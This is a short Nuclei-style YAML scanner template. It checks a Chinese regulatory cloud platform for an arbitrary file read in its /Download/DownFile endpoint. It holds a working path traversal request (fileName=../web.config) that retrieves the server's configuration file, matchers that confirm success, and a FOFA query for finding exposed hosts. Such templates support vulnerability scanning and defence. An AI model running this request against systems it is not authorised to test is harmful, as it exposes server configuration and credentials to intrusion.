id: zkzyvts-DownFile-fileread
info:
  name: 中科智远科技综合监管云平台 DownFile - fileread
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E4%B8%AD%E7%A7%91%E6%99%BA%E8%BF%9C%E7%A7%91%E6%8A%80-%E7%BB%BC%E5%90%88%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0DownFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: icon_hash="-227059202"
  tags: zkzyvts,fileread

http:
  - raw:
      - |
        GET /Download/DownFile?fileName=../web.config HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<?xml"
          - "configuration"
          - "microsoft"
        condition: and

      - type: status
        status:
          - 200